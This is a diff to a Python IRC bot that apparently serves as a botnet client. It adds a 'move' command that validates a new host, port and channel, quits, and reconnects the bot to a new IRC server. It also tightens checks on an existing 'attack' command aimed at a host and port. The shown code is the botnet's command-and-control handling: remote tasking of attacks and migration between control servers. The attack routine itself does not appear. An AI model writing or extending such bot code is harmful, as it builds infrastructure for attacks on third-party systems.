@@ -32,6 +32,30 @@ def parsemsg(s):
     command = args.pop(0)
     return prefix, command, args
 
+def check_move(line):
+
+    if(len(line) < 4):
+        return False
+
+    if(not check.hostname(line[1])):
+        return False
+
+    if(not check.port(line[2])):
+        return False
+
+    if(not check.connection(line[1], line[2])):
+        return False
+
+    return True
+
+def move(s, sender, host, port, chan):
+    global HOST, PORT, CHAN
+    HOST = host
+    PORT = int(port)
+    CHAN = chan
+    s.send(bytearray('PRIVMSG ' + sender + ' :' + NICK + ' : moved to new IRC SERVER\r\n', 'utf-8'))
+    s.send("QUIT\r\n".format(CHAN).encode("utf-8"))
+
 #takes in a list
 def check_attack(line):
 
@@ -46,6 +70,9 @@ def check_attack(line):
     #checks valid port
     if(not check.port(line[2])):
         return False    
+
+    if(not check.connection(line[1], line[2])):
+        return False
 
     return True
 
@@ -140,9 +167,13 @@ if __name__ == "__main__":
                             
                                 #ryt now only check if it has move then it disconnects, then reconnects
                                 elif 'move' in args[1]:
-                                    s.send("QUIT\r\n".format(CHAN).encode("utf-8"))
-                                    #update <host-name> <port> <channel>
-                                    break
+                                    arguments = args[1].split()
+                                    print(arguments)
+                                    if(check_move(arguments)):
+                                        move(s, sender, arguments[1], arguments[2], arguments[3])
+                                        break
+                                    else:
+                                        s.send(bytearray('PRIVMSG ' + sender + ' :' + NICK + ' : invalid move\r\n', 'utf-8'))
                                 
                                 #should be working, has error checking too
                                 elif 'attack' in args[1]:
@@ -153,8 +184,6 @@ if __name__ == "__main__":
                                     else:
                                         s.send(bytearray('PRIVMSG ' + sender + ' :' + NICK + ' : invalid attack\r\n', 'utf-8'))
 
-                                elif 'move' in args[1]:
-                                    arguments = args[1].split()
                     #print(response)
                 s.close()
 
